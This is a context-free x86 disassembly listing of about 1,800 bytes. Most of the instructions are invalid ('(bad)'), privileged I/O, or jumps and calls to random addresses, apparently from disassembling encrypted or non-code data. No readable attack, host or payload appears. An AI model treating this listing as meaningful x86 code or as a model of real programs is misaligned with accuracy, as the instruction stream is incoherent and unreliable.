  41dd1b:	inc    DWORD PTR [esi]
  41dd1d:	(bad)  
  41dd1e:	cld    
  41dd1f:	add    ebp,ebx
  41dd21:	(bad)  
  41dd23:	fisttp QWORD PTR [esi]
  41dd25:	add    eax,0xe1bde9e7
  41dd2a:	(bad)  
  41dd2b:	retf   0xc4e4
  41dd2e:	cli    
  41dd2f:	shl    BYTE PTR [esi-0x2f405208],0xcf
  41dd36:	mov    cl,0xb0
  41dd38:	loop   0x41dd3b
  41dd3a:	mov    ecx,0xe5fc05bd
  41dd3f:	ret    
  41dd40:	jmp    0x41dd46
  41dd42:	retf   
  41dd43:	loopne 0x41dd4e
  41dd45:	add    ecx,DWORD PTR [ecx]
  41dd47:	push   cs
  41dd48:	repz out dx,eax
  41dd4a:	jecxz  0x41dd3b
  41dd4c:	mov    cl,0xcd
  41dd4e:	iret   
  41dd4f:	mov    ch,0xb0
  41dd51:	lock sar al,1
  41dd54:	mov    bh,0xda
  41dd56:	mov    esp,0xe3d7b703
  41dd5b:	aam    0xdd
  41dd5d:	mov    ebp,0x7d6ebe0
  41dd62:	push   es
  41dd63:	iret   
  41dd64:	stc    
  41dd65:	pop    es
  41dd66:	in     al,0xf3
  41dd68:	bnd call 0xcb25ac61
  41dd6e:	call   0xf7fb975c
  41dd73:	retf   
  41dd74:	hlt    
  41dd75:	aam    0xd9
  41dd77:	loope  0x41dd54
  41dd79:	loopne 0x41dd71
  41dd7b:	fld    QWORD PTR [ecx]
  41dd7d:	in     al,dx
  41dd7e:	or     cl,BYTE PTR [edx]
  41dd80:	add    edx,esi
  41dd82:	jmp    0x41dd8d
  41dd84:	out    0xf,al
  41dd86:	add    eax,0xb1efb1cf
  41dd8b:	cmc    
  41dd8c:	(bad)  
  41dd8d:	out    dx,al
  41dd8e:	test   dh,0xd2
  41dd91:	mov    ah,0xe6
  41dd93:	repz out dx,eax
  41dd95:	mov    ebp,0xb6bbe3f9
  41dd9a:	sti    
  41dd9b:	lock mov esi,0xf0dbd003
  41dda1:	fsubp  st(1),st
  41dda3:	jmp    0x226dc95
  41dda8:	fincstp 
  41ddaa:	call   0xaa27c076
  41ddaf:	sti    
  41ddb0:	fidivr DWORD PTR [edx-0x2d0b202d]
  41ddb6:	mov    ebp,0xdce0bbd1
  41ddbb:	pop    es
  41ddbc:	lock out 0x1,al
  41ddbf:	jmp    0x41dd8a
  41ddc1:	in     al,0xf8
  41ddc3:	out    dx,al
  41ddc4:	retf   
  41ddc5:	int3   
  41ddc6:	loop   0x41ddb5
  41ddc8:	repz ret 
  41ddca:	iret   
  41ddcb:	int3   
  41ddcc:	out    dx,al
  41ddcd:	mov    al,0xb0
  41ddcf:	mov    al,0xe1
  41ddd1:	retf   
  41ddd2:	mov    al,0xb4
  41ddd4:	fdivr  st,st(5)
  41ddd6:	call   0xc825b0d7
  41dddb:	rol    DWORD PTR [edx],1
  41dddd:	loop   0x41ddba
  41dddf:	stc    
  41dde0:	or     edi,eax
  41dde2:	out    0xcb,al
  41dde4:	enter  0xcece,0xca
  41dde8:	mov    cl,0xd1
  41ddea:	jmp    0x41dddd
  41ddec:	mov    dh,0xc1
  41ddee:	out    dx,eax
  41ddef:	mov    dh,0xd3
  41ddf1:	sar    BYTE PTR [ebx-0x35351a06],cl
  41ddf7:	retf   0xd3f2
  41ddfa:	into   
  41ddfb:	pop    es
  41ddfc:	shl    ecx,0xf9
  41ddff:	add    ebp,eax
  41de01:	mov    BYTE PTR [edi+ebp*8],0xa
  41de05:	(bad)  
  41de06:	out    0xec,eax
  41de08:	in     eax,dx
  41de09:	mov    edi,0xb6e7d3df
  41de0e:	icebp  
  41de0f:	loope  0x41ddd1
  41de11:	rcr    cl,1
  41de13:	std    
  41de14:	jmp    0xce07:0xdbdaf8bc
  41de1b:	rol    BYTE PTR ds:0xc602f3d0,0xdb
  41de22:	(bad)  
  41de23:	std    
  41de24:	sti    
  41de25:	ret    0xe9e0
  41de28:	out    dx,eax
  41de29:	stos   BYTE PTR es:[edi],al
  41de2a:	jmp    0xebecc8e2
  41de2f:	retf   
  41de30:	call   0xeb379814
  41de35:	fdivr  st(6),st
  41de37:	xlat   BYTE PTR ds:[ebx]
  41de38:	(bad)  
  41de39:	mov    esi,0xe5fee1c0
  41de3e:	test   ah,0xc2
  41de41:	jmp    0xe05b91c
  41de46:	loope  0x41de30
  41de48:	stos   BYTE PTR es:[edi],al
  41de49:	shl    cl,1
  41de4b:	mov    al,0xcd
  41de4d:	out    0xc2,al
  41de4f:	mov    cl,0xcb
  41de51:	test   dh,0xbb
  41de54:	fcmovne st,st(5)
  41de56:	hlt    
  41de57:	cmc    
  41de58:	clc    
  41de59:	(bad)  
  41de5b:	fcomip st,st(6)
  41de5d:	jmp    0x41de39
  41de5f:	fsubr  st(4),st
  41de61:	or     ch,al
  41de63:	shl    ah,0x4
  41de66:	fmul   DWORD PTR [eax*8-0xd421719]
  41de6d:	fadd   st(2),st
  41de6f:	aam    0xf9
  41de71:	fcomi  st,st(3)
  41de73:	jmp    0xfcb9:0xc9b8d5bd
  41de7a:	mov    esi,0xf6f302ee
  41de7f:	(bad)  
  41de80:	lds    ecx,FWORD PTR [edi]
  41de82:	loopne 0x41de68
  41de84:	std    
  41de85:	hlt    
  41de86:	in     eax,0x2
  41de88:	fdiv   st,st(0)
  41de8a:	ffree  st(7)
  41de8c:	(bad)  
  41de8d:	(bad)  
  41de8e:	shl    esp,1
  41de90:	rcl    ebp,1
  41de92:	xlat   BYTE PTR ds:[ebx]
  41de93:	in     eax,dx
  41de94:	fistp  QWORD PTR [ebx-0xd314436]
  41de9a:	clc    
  41de9b:	int3   
  41de9c:	(bad)  
  41de9e:	jmp    0x41de70
  41dea0:	fst    st(7)
  41dea2:	hlt    
  41dea3:	or     al,ah
  41dea5:	retf   
  41dea6:	int3   
  41dea7:	stc    
  41dea8:	mov    esp,0xc1a4e9e2
  41dead:	jmp    0x41dea1
  41deaf:	sti    
  41deb0:	jmp    0x41de85
  41deb2:	mov    ch,0xd9
  41deb4:	jmp    0xf9c1:0xfeedcef1
  41debb:	out    0xc3,al
  41debd:	(bad)  
  41debe:	rol    DWORD PTR [ebx],1
  41dec0:	add    DWORD PTR [ecx],eax
  41dec2:	ror    dh,0xd8
  41dec5:	jecxz  0x41deb9
  41dec7:	in     eax,0xe5
  41dec9:	mov    esi,0xb5d7c1a8
  41dece:	(bad)  
  41ded0:	hlt    
  41ded1:	fcomi  st,st(0)
  41ded3:	mov    eax,0xe9dcc4d8
  41ded8:	out    dx,eax
  41ded9:	int    0xc1
  41dedb:	fild   DWORD PTR [edx]
  41dedd:	jecxz  0x41debe
  41dedf:	mul    edi
  41dee1:	add    eax,DWORD PTR [edx]
  41dee3:	call   0xef48e6ca
  41dee8:	shl    BYTE PTR [esi-0x1a0f4c14],0xe1
  41deef:	ror    dl,1
  41def1:	in     al,dx
  41def2:	out    dx,al
  41def3:	rol    ch,cl
  41def5:	jmp    0xc104ced7
  41defa:	fucom  st(3)
  41defc:	cli    
  41defd:	in     al,0xe3
  41deff:	(bad)
  41df03:	iret   
  41df04:	(bad)  
  41df05:	in     al,0xe8
  41df07:	in     al,0xe1
  41df09:	int3   
  41df0a:	loop   0x41dee3
  41df0c:	mov    ch,0xd1
  41df0e:	shl    edx,0xfb
  41df11:	call   0xcf39cbc3
  41df16:	out    dx,al
  41df17:	out    dx,eax
  41df18:	mov    esp,0xf1d9bede
  41df1d:	fdivp  st(2),st
  41df1f:	aam    0xc6
  41df21:	hlt    
  41df22:	mov    ebp,0xe9fdd8cf
  41df27:	shr    BYTE PTR [ecx-0x4c101444],0xac
  41df2e:	xlat   BYTE PTR ds:[ebx]
  41df2f:	mov    ch,0xef
  41df31:	aad    0xd0
  41df33:	iret   
  41df34:	ror    dl,1
  41df36:	imul   ah
  41df38:	enter  0xd6de,0x0
  41df3c:	add    al,0xd1
  41df3e:	cmc    
  41df3f:	repnz leave 
  41df41:	out    0xd4,eax
  41df43:	retf   
  41df44:	(bad)  
  41df46:	into   
  41df47:	cli    
  41df48:	retf   0xb3ea
  41df4b:	(bad)  
  41df4d:	aam    0xb2
  41df4f:	aad    0xf8
  41df51:	retf   
  41df52:	test   dh,0xcd
  41df55:	jmp    0x41df31
  41df57:	aad    0xcd
  41df59:	(bad)  
  41df5a:	out    0xf7,eax
  41df5c:	pop    es
  41df5d:	test   DWORD PTR [ebx],0xbdf7e5c1
  41df63:	cmc    
  41df64:	out    0xc8,al
  41df66:	or     esp,edi
  41df68:	stos   DWORD PTR es:[edi],eax
  41df69:	int    0xc6
  41df6b:	out    0xac,eax
  41df6d:	jecxz  0x41df38
  41df6f:	shl    al,cl
  41df71:	icebp  
  41df72:	ror    esp,cl
  41df74:	cmc    
  41df75:	(bad)  
  41df76:	in     eax,dx
  41df77:	std    
  41df78:	lock jecxz 0x41df52
  41df7b:	rcl    esi,cl
  41df7d:	fstp   st(7)
  41df7f:	(bad)  
  41df80:	rcr    ch,0xdc
  41df83:	in     al,0xc5
  41df85:	int3   
  41df86:	jmp    0xd1cf:0xf3f7f2d9
  41df8d:	(bad)  
  41df8e:	mov    bh,0xc4
  41df90:	aam    0xf7
  41df92:	fdivp  st(6),st
  41df94:	(bad)  
  41df95:	fidivr WORD PTR [ebp+ecx*8-0x3e433330]
  41df9c:	in     eax,dx
  41df9d:	ffreep st(6)
  41df9f:	mov    esp,0xdc0af7fb
  41dfa4:	call   0xae0fab84
  41dfa9:	mov    esp,0xedc9b3c7
  41dfae:	retf   0xc0d5
  41dfb1:	mov    ah,0xcc
  41dfb3:	sti    
  41dfb4:	mov    ch,0x3
  41dfb6:	ret    
  41dfb7:	fsub   st,st(2)
  41dfb9:	fabs   
  41dfbb:	(bad)  
  41dfbd:	loop   0x41dfb7
  41dfbf:	add    esp,esi
  41dfc1:	clc    
  41dfc2:	(bad)  
  41dfc3:	or     ah,dl
  41dfc5:	fsubp  st(2),st
  41dfc7:	or     BYTE PTR [ebx-0x19192f58],dh
  41dfcd:	lds    esi,FWORD PTR [eax-0x150d2b0f]
  41dfd3:	(bad)  
  41dfd4:	jmp    0xc7d4:0xc1f8fae8
  41dfdb:	xlat   BYTE PTR ds:[ebx]
  41dfdc:	mov    ebx,0xfddae0
  41dfe1:	out    dx,eax
  41dfe2:	imul   edx
  41dfe4:	(bad)  
  41dfe6:	int3   
  41dfe7:	out    dx,al
  41dfe8:	lds    esp,FWORD PTR [esi-0xd0f3215]
  41dfee:	(bad)  
  41dfef:	in     al,0xc8
  41dff1:	mov    dh,0xd2
  41dff3:	mov    ch,0xbb
  41dff5:	jmp    0xe82199c5
  41dffa:	not    cl
  41dffc:	push   es
  41dffd:	sar    esi,0xd6
  41e000:	xlat   BYTE PTR ds:[ebx]
  41e001:	fucomip st,st(1)
  41e003:	ror    dl,0xe7
  41e006:	pop    es
  41e007:	add    ebp,DWORD PTR [esi-0x4d4c2331]
  41e00d:	aad    0xac
  41e00f:	jmp    0x41dfc6
  41e011:	in     al,dx
  41e012:	mov    dh,0xd2
  41e014:	jmp    0xb904aa04
  41e019:	repz iret 
  41e01b:	rol    BYTE PTR ds:0xd7e0f7fc,cl
  41e021:	add    al,0x1
  41e023:	(bad)  
  41e024:	loopne 0x41e025
  41e026:	add    al,BYTE PTR [edx]
  41e028:	test   al,0xe6
  41e02a:	jmp    0xc42dabfc
  41e02f:	in     al,dx
  41e030:	lds    esi,FWORD PTR [edi-0x26342545]
  41e036:	retf   0xcdb8
  41e039:	enter  0xcecc,0xd3
  41e03d:	loope  0x41e01c
  41e03f:	dec    dl
  41e041:	fucom  st(1)
  41e043:	(bad)  
  41e045:	out    0xc1,al
  41e047:	fsubr  DWORD PTR [ecx-0x121b5633]
  41e04d:	(bad)  
  41e04e:	cmc    
  41e04f:	out    0xcc,eax
  41e051:	aam    0xef
  41e053:	out    0xc9,al
  41e055:	retf   0xbbd2
  41e058:	mov    esi,0xe3d7dac3
  41e05d:	out    0xda,eax
  41e05f:	out    0x5,eax
  41e061:	mov    esi,0xca080fe6
  41e066:	in     al,0x8
  41e068:	loopne 0x41e010
  41e06a:	in     eax,0xf3
  41e06c:	call   0xc50c8e58
  41e071:	mov    ah,0xc8
  41e073:	(bad)  
  41e074:	(bad)  
  41e075:	call   eax
  41e077:	add    edi,DWORD PTR [edi-0x253e2609]
  41e07d:	(bad)  
  41e080:	(bad)  
  41e081:	aam    0xe0
  41e083:	prefetchw (bad)
  41e084:	or     eax,0xe4ffc4cd
  41e089:	stos   BYTE PTR es:[edi],al
  41e08a:	int    0xf6
  41e08c:	loopne 0x41e03b
  41e08e:	out    0xee,al
  41e090:	into   
  41e091:	jmp    0xf8f2:0xbefed5c7
  41e098:	leave  
  41e099:	xlat   BYTE PTR ds:[ebx]
  41e09a:	push   esp
  41e09c:	fsub   st,st(3)
  41e09e:	out    0xd5,al
  41e0a0:	sti    
  41e0a1:	(bad)  
  41e0a2:	leave  
  41e0a3:	stc    
  41e0a4:	enter  0xd8ce,0xd8
  41e0a8:	int3   
  41e0a9:	repnz loop 0x41e06e
  41e0ac:	rol    cl,0xcc
  41e0af:	mov    cl,0xdb
  41e0b1:	mov    ah,0xe6
  41e0b3:	ror    edx,1
  41e0b5:	lock (bad) 
  41e0b7:	fcmovbe st,st(1)
  41e0b9:	int3   
  41e0ba:	div    esi
  41e0bc:	jecxz  0x41e0ba
  41e0be:	sti    
  41e0bf:	or     ebx,ecx
  41e0c1:	add    cl,bh
  41e0c3:	add    al,BYTE PTR [ebx]
  41e0c5:	or     bh,ah
  41e0c7:	add    bl,dl
  41e0c9:	test   al,0xea
  41e0cb:	out    0xeb,eax
  41e0cd:	into   
  41e0ce:	mov    al,0xfb
  41e0d0:	loope  0x41e0a0
  41e0d2:	aam    0xed
  41e0d4:	aam    0xd6
  41e0d6:	leave  
  41e0d7:	repnz stc 
  41e0d9:	sar    DWORD PTR [edi-0x1538422a],1
  41e0df:	cli    
  41e0e0:	retf   
  41e0e1:	jmp    0x449ebf4
  41e0e6:	cli    
  41e0e7:	(bad)  
  41e0e9:	in     eax,dx
  41e0ea:	rol    ebx,1
  41e0ec:	in     al,dx
  41e0ed:	loope  0x41e0c2
  41e0ef:	in     eax,0xf8
  41e0f1:	in     al,dx
  41e0f2:	jmp    0xecffdeae
  41e0f7:	ret    
  41e0f8:	mov    ebx,0xfa07e1d0
  41e0fd:	shl    dh,1
  41e0ff:	in     eax,0xc2
  41e101:	(bad)  
  41e102:	test   al,0xc8
  41e105:	aam    0xc5
  41e107:	fistp  QWORD PTR [esi-0x2b2e3c37]
  41e10d:	rol    ebp,0xac
  41e110:	mov    ch,0xb2
  41e112:	leave  
  41e113:	fcmovne st,st(3)
  41e115:	xlat   BYTE PTR ds:[ebx]
  41e116:	mov    ch,0xf1
  41e118:	int    0xf3
  41e11a:	int    0xdb
  41e11c:	fst    st(7)
  41e11e:	loope  0x41e0f8
  41e120:	clc    
  41e121:	out    dx,eax
  41e122:	pop    es
  41e123:	call   0xc12cda0b
  41e128:	stos   DWORD PTR es:[edi],eax
  41e129:	(bad)  
  41e12a:	into   
  41e12b:	aad    0xf5
  41e12d:	into   
  41e12e:	in     eax,0xe6
  41e130:	(bad)
  41e134:	mov    esi,0xcef0cdcd
  41e139:	in     al,dx
  41e13a:	(bad)  
  41e13b:	not    bh
  41e13d:	or     edi,esp
  41e13f:	xlat   BYTE PTR ds:[ebx]
  41e140:	add    al,ch
  41e142:	add    DWORD PTR ds:0xe8caf8,eax
  41e148:	(bad)  
  41e14a:	mov    cl,0xc6
  41e14c:	rcl    edi,cl
  41e14e:	test   al,0xd6
  41e151:	aad    0xef
  41e153:	fmul   st,st(5)
  41e155:	mov    edi,0xe7c3b9c8
  41e15a:	xlat   BYTE PTR ds:[ebx]
  41e15b:	pop    es
  41e15c:	std    
  41e15d:	add    bl,ch
  41e15f:	(bad)  
  41e161:	retf   0xdaf7
  41e164:	psrad  mm1,mm0
  41e167:	add    esi,ebp
  41e169:	enter  0xeba9,0xf0
  41e16d:	ror    ebx,cl
  41e16f:	div    BYTE PTR [edx-0x37100038]
  41e175:	icebp  
  41e176:	repnz xlat BYTE PTR ds:[ebx]
  41e178:	enter  0x6d6,0xff
  41e17c:	pop    es
  41e17d:	out    0xea,al
  41e17f:	(bad)  
  41e181:	lock fstp st(5)
  41e184:	wbinvd 
  41e186:	call   0xef06c694
  41e18b:	call   0xdaf8bd50
  41e190:	loopne 0x41e168
  41e192:	imul   cl
  41e194:	shr    dl,cl
  41e196:	shr    esi,1
  41e198:	mov    eax,0xfdbff0f0
  41e19d:	fcomi  st,st(0)
  41e19f:	aam    0x6
  41e1a1:	leave  
  41e1a2:	div    ebp
  41e1a4:	add    cl,BYTE PTR [edi]
  41e1a6:	adc    cl,bl
  41e1a8:	fsubr  DWORD PTR [ebp+edi*4-0x4435313b]
  41e1af:	mov    ch,0xe9
  41e1b1:	mov    cl,0xcf
  41e1b3:	mov    ah,0xca
  41e1b5:	mov    ebx,0x1f8c8de
  41e1ba:	repz fst st(3)
  41e1bd:	ret    0x304
  41e1c0:	sar    ebp,0xfa
  41e1c3:	or     DWORD PTR [edi],eax
  41e1c5:	retf   0xc9cc
  41e1c8:	mov    bl,0xf2
  41e1ca:	mov    esp,0xd6eae2a4
  41e1cf:	out    dx,al
  41e1d0:	out    dx,al
  41e1d1:	(bad)  
  41e1d2:	fcmovbe st,st(5)
  41e1d4:	cld    
  41e1d5:	mov    dh,0xe8
  41e1d7:	repnz bnd call 0xff1ab6ba
  41e1de:	rcl    bh,1
  41e1e0:	std    
  41e1e1:	in     eax,0xd9
  41e1e3:	(bad)
  41e1e6:	retf   
  41e1e7:	loope  0x41e1a7
  41e1e9:	lods   al,BYTE PTR ds:[esi]
  41e1ea:	int3   
  41e1eb:	lods   eax,DWORD PTR ds:[esi]
  41e1ec:	call   0xbbf2b0e3
  41e1f1:	out    dx,al
  41e1f2:	mov    eax,0xfef8dafe
  41e1f7:	fdivr  DWORD PTR [ebx-0x2f030d01]
  41e1fd:	icebp  
  41e1fe:	push   es
  41e1ff:	repnz pop es
  41e201:	cmc    
  41e202:	push   cs
  41e203:	out    0xa,eax
  41e205:	loope  0x41e1d6
  41e207:	add    BYTE PTR [edi-0x104d125a],bh
  41e20d:	mov    ch,0xf7
  41e20f:	sti    
  41e210:	rcr    bh,0xb7
  41e213:	mov    dh,0xbf
  41e215:	mov    esi,0xcee2c3d5
  41e21a:	mov    esi,0xf1fbd9e3
  41e21f:	loop   0x41e226
  41e221:	fsubp  st(7),st
  41e223:	add    edx,edi
  41e225:	or     al,0xe9
  41e227:	call   0xbcf4cced
  41e22c:	div    ecx
  41e22e:	out    0xf4,eax
  41e230:	out    dx,eax
  41e231:	hlt    
  41e232:	jmp    0x41e20d
  41e234:	fcmovbe st,st(0)
  41e236:	aad    0xd5
  41e238:	sti    
  41e239:	(bad)  
  41e23b:	add    dl,bl
  41e23d:	repnz (bad) 
  41e23f:	std    
  41e240:	loope  0x41e226
  41e242:	loop   0x41e200
  41e244:	jmp    0xf125ef41
  41e249:	mov    dl,0xb3
  41e24b:	out    dx,al
  41e24c:	lock (bad) 
  41e24e:	ror    ebx,cl
  41e250:	(bad)  
  41e251:	(bad)  
  41e252:	retf   
  41e253:	clc    
  41e254:	cld    
  41e255:	fidiv  DWORD PTR [edx+ebx*8-0xc3f3733]
  41e25c:	frstpm(287 only) 
  41e25e:	aam    0xde
  41e260:	fiadd  WORD PTR [edx]
  41e262:	aam    0xf5
  41e264:	retf   
  41e265:	int    0x8
  41e267:	or     eax,0xf2eebee9
  41e26c:	jmp    0xcff0:0xcbe7c3f4
  41e273:	retf   
  41e274:	in     eax,0xbb
  41e276:	(bad)  
  41e278:	lock cmc 
  41e27a:	mov    eax,0xf8dc00b8
  41e27f:	add    al,0xda
  41e281:	in     eax,0xe4
  41e283:	std    
  41e284:	fisttp QWORD PTR [esi]
  41e286:	fstp   st(7)
  41e288:	in     al,0xbd
  41e28a:	int3   
  41e28b:	leave  
  41e28c:	shl    edi,cl
  41e28e:	mov    dh,0xa8
  41e290:	into   
  41e291:	lds    esi,FWORD PTR [ecx-0x12351316]
  41e297:	sti    
  41e298:	cli    
  41e299:	loop   0x41e277
  41e29b:	ffreep st(0)
  41e29d:	loopne 0x41e286
  41e29f:	rcl    al,cl
  41e2a1:	call   0xed3ee267
  41e2a6:	retf   
  41e2a7:	shl    ah,cl
  41e2a9:	retf   0xb6ec
  41e2ac:	retf   
  41e2ad:	jmp    0xe8368fa8
  41e2b2:	stc    
  41e2b3:	fidivr WORD PTR [eax-0x110f3124]
  41e2b9:	add    esi,edx
  41e2bb:	sar    DWORD PTR [ebp-0x1827090e],0x4
  41e2c2:	(bad)  
  41e2c3:	fmul   DWORD PTR [esp+ebx*8]
  41e2c6:	clc    
  41e2c7:	rcr    dh,cl
  41e2c9:	lock into 
  41e2cb:	in     eax,0xbd
  41e2cd:	retf   
  41e2ce:	mov    dl,0xb5
  41e2d0:	clc    
  41e2d1:	sar    dh,0xb6
  41e2d4:	fcmovbe st,st(0)
  41e2d6:	fdivp  st(4),st
  41e2d8:	mov    esi,0xd2d9cfcd
  41e2dd:	ret    
  41e2de:	les    eax,FWORD PTR [edi]
  41e2e0:	std    
  41e2e1:	(bad)  
  41e2e3:	in     eax,0xe2
  41e2e5:	in     eax,0xdb
  41e2e7:	push   es
  41e2e8:	lods   eax,DWORD PTR ds:[esi]
  41e2e9:	out    dx,al
  41e2ea:	int3   
  41e2eb:	jecxz  0x41e2cd
  41e2ed:	iret   
  41e2ee:	out    0xf7,al
  41e2f0:	(bad)  
  41e2f1:	repnz mov edx,0xf5f0f0cf
  41e2f7:	fistp  QWORD PTR [edi-0x3f21fe4a]
  41e2fd:	xlat   BYTE PTR ds:[ebx]
  41e2fe:	clc    
  41e2ff:	(bad)
  41e302:	sti    
  41e303:	loop   0x41e2e9
  41e305:	in     al,0xee
  41e307:	fpatan 
  41e309:	jmp    0xf6cd:0xe6b1d6ec
  41e310:	mov    ebx,0xbeebb5fa
  41e315:	int    0xfe
  41e317:	hlt    
  41e318:	int    0xd5
  41e31a:	mov    ch,0xc0
  41e31c:	add    bl,bh
  41e31e:	fcmovnu st,st(3)
  41e320:	aad    0xfd
  41e322:	or     edi,esi
  41e324:	add    al,0xf8
  41e326:	in     al,dx
  41e327:	jecxz  0x41e2d2
  41e329:	retf   0xcfed
  41e32c:	out    0xc3,eax
  41e32e:	mov    dl,0xea
  41e330:	imul   al
  41e332:	mov    ah,0xd1
  41e334:	retf   
  41e335:	mov    dh,0xf1
  41e337:	mov    ecx,0xbdf0ccd1
  41e33c:	out    0xf3,eax
  41e33e:	les    ecx,FWORD PTR [ebx]
  41e340:	leave  
  41e341:	or     esp,eax
  41e343:	or     ecx,DWORD PTR [eax]
  41e345:	loope  0x41e359
  41e347:	jmp    0x41e2fc
  41e349:	rcl    eax,cl
  41e34b:	mov    al,0xc4
  41e34d:	jmp    0xdbf1:0xd9cfbbc5
  41e354:	icebp  
  41e355:	fdivr  DWORD PTR [esi+0x6e8ffb4]
  41e35b:	fiadd  DWORD PTR [edx]
  41e35d:	pop    es
  41e35e:	ffreep st(0)
  41e360:	test   BYTE PTR [edi],0xd5
  41e363:	leave  
  41e364:	or     DWORD PTR [esi+ecx*1],eax
  41e367:	icebp  
  41e368:	scas   al,BYTE PTR es:[edi]
  41e369:	lods   al,BYTE PTR ds:[esi]
  41e36a:	shr    ebp,1
  41e36c:	(bad)  
  41e36d:	xlat   BYTE PTR ds:[ebx]
  41e36e:	ret    0xdbba
  41e371:	ror    ch,0xb6
  41e374:	aam    0xbb
  41e376:	mov    edi,0xd1d700e3
  41e37b:	bnd call edi
  41e37e:	repz ror ebx,1
  41e381:	cld    
  41e382:	in     al,0xdd
  41e384:	into   
  41e385:	add    al,0xcd
  41e387:	out    dx,al
  41e388:	(bad)  
  41e389:	shr    dh,0xc0
  41e38c:	ret    
  41e38d:	ret    
  41e38e:	repnz out dx,al
  41e390:	(bad)  
  41e392:	mov    edi,0xfcfdd6f8
  41e397:	add    bh,BYTE PTR [esi-0x26f80f34]
  41e39d:	repz push es
  41e39f:	jecxz  0x41e38c
  41e3a1:	(bad)  
  41e3a2:	or     dh,bh
  41e3a4:	fmulp  st(5),st
  41e3a6:	jmp    0xeb1aa3ba
  41e3ab:	xlat   BYTE PTR ds:[ebx]
  41e3ac:	out    dx,al
  41e3ad:	mov    dl,0xd3
  41e3af:	aad    0xea
  41e3b1:	fmul   st,st(3)
  41e3b3:	fucomp st(6)
  41e3b5:	jmp    0xdafeba6b
  41e3ba:	shl    edi,1
  41e3bc:	aam    0xe0
  41e3be:	aam    0xe1
  41e3c0:	(bad)  
  41e3c1:	in     al,0x1
  41e3c3:	hlt    
  41e3c4:	clc    
  41e3c5:	jmp    0xc5bd:0xf3c0decf
  41e3cc:	jecxz  0x41e394
  41e3ce:	loopne 0x41e3bc
  41e3d0:	lock jmp 0xb0bc:0xfbcedddf
  41e3d8:	loopne 0x41e3c2
  41e3da:	aad    0xfa
  41e3dc:	out    0xe4,eax
  41e3de:	(bad)  
  41e3df:	rol    DWORD PTR [ebx],1
  41e3e1:	loopne 0x41e3d1
  41e3e3:	or     eax,0x90ded0c
  41e3e8:	test   al,0xe5
  41e3ea:	(bad)  
  41e3ec:	xlat   BYTE PTR ds:[ebx]
  41e3ed:	ret    
  41e3ee:	rol    dh,0xd8
  41e3f1:	(bad)  
  41e3f2:	(bad)  
  41e3f3:	call   0xfb10b8ee
  41e3f8:	loope  0x41e3fb
  41e3fa:	mov    ch,0x7
  41e3fc:	(bad)  
  41e3fd:	test   BYTE PTR ds:0xdafbf6f9,0xe3
  41e404:	fldln2 
  41e406:	fcmovnu st,st(1)
  41e408:	(bad)
  41e40b:	jmp    0x41e3da
  41e40d:	out    dx,al
  41e40e:	lods   eax,DWORD PTR ds:[esi]
  41e40f:	hlt    
  41e410:	in     al,dx
  41e411:	xlat   BYTE PTR ds:[ebx]
  41e412:	xlat   BYTE PTR ds:[ebx]
  41e413:	ror    esi,1
  41e415:	(bad)  
  41e416:	out    dx,eax
  41e417:	faddp  st(2),st
  41e419:	sti    
  41e41a:	aad    0x2
  41e41c:	jecxz  0x41e3df
  41e41e:	add    esp,edi
  41e420:	mov    edi,0xd9e9ebf4
  41e425:	in     al,dx
  41e426:	fcmovne st,st(1)
  41e428:	mov    esp,0xe0eacae6
  41e42d:	mov    dl,0xf2
  41e42f:	jmp    0xdeb7:0xd1e4b9b4
  41e436:	jmp    0xfb38e03e
  41e43b:	stc    
  41e43c:	(bad)  
  41e43d:	(bad)  
  41e43e:	clc    
  41e43f:	out    0xf6,al
  41e441:	ret    0xe9e6
  41e444:	(bad)  
  41e446:	clc    
  41e447:	(bad)  
  41e448:	call   0xe518ab33
  41e44d:	mov    cl,0xc2
  41e44f:	stc    
  41e450:	mov    dh,0xb0
  41e452:	cmc    
  41e453:	test   esp,0xbcfefbf2
  41e459:	call   0x104b740
  41e45e:	clc    
  41e45f:	clc    
  41e460:	out    0xf9,al
  41e462:	loope  0x41e42d
  41e464:	in     al,0xda
  41e466:	sti    
  41e467:	stc    
  41e468:	in     eax,0xf2
  41e46a:	(bad)  
  41e46b:	scas   eax,DWORD PTR es:[edi]
  41e46c:	(bad)  
  41e46d:	aam    0xd7
  41e46f:	mov    bh,0xec
  41e471:	mov    ebx,0xd3b7cedf
  41e476:	fdivr  DWORD PTR [edi-0x21002637]
  41e47c:	sti    
  41e47d:	cld    
  41e47e:	or     al,dl
  41e480:	ror    edx,1
  41e482:	out    dx,eax
  41e483:	push   es
  41e484:	push   es
  41e485:	out    dx,al
  41e486:	in     eax,dx
  41e487:	push   cs
  41e488:	ret    
  41e489:	jmp    0x41e44b
  41e48b:	aad    0xc6
  41e48d:	retf   0xe7da
  41e490:	stc    
  41e491:	(bad)  
  41e493:	mov    edi,0xf8d2cdec
  41e498:	leave  
  41e499:	loop   0x41e493
  41e49b:	(bad)  
  41e49d:	ret    
  41e49e:	fcmovnbe st,st(5)
  41e4a0:	or     dh,al
  41e4a2:	or     edi,esi
  41e4a4:	loopne 0x41e4b9
  41e4a6:	in     eax,0x7
  41e4a8:	enter  0xbfd7,0xc3
  41e4ac:	div    al
  41e4ae:	enter  0xc7bb,0xca
  41e4b2:	shl    BYTE PTR [ebp+0x2f0e4f5],cl
  41e4b8:	faddp  st(0),st
  41e4ba:	add    BYTE PTR [edi],al
  41e4bc:	cmc    
  41e4bd:	fild   DWORD PTR [eax]
  41e4bf:	hlt    
  41e4c0:	ret    0xe4e9
  41e4c3:	(bad)  
  41e4c5:	jmp    0xdf2ab8b0
  41e4ca:	(bad)  
  41e4cb:	iret   
  41e4cc:	leave  
  41e4cd:	lods   al,BYTE PTR ds:[esi]
  41e4ce:	int    0xca
  41e4d0:	sti    
  41e4d1:	mov    ecx,0xf8bef6df
  41e4d6:	(bad)  [eax+ecx*8-0x12113cff]
  41e4dd:	out    0x1,al
  41e4df:	loop   0x41e4c6
  41e4e1:	add    al,BYTE PTR [eax+ecx*1]
  41e4e4:	inc    DWORD PTR ds:0xd3e204e9
  41e4ea:	into   
  41e4eb:	out    0xc6,eax
  41e4ed:	in     eax,dx
  41e4ee:	int    0xd4
  41e4f0:	out    0xf1,al
  41e4f2:	jmp    0xda00d5e0
  41e4f7:	stc    
  41e4f8:	xlat   BYTE PTR ds:[ebx]
  41e4f9:	enter  0xc7bf,0xc3
  41e4fd:	sar    esi,cl
  41e4ff:	idiv   esi
  41e501:	pandn  mm5,mm3
  41e504:	leave  
  41e505:	(bad)  
  41e507:	clc    
  41e508:	leave  
  41e509:	rol    edx,1
  41e50b:	jmp    0xe8ed:0xc5d6aab0
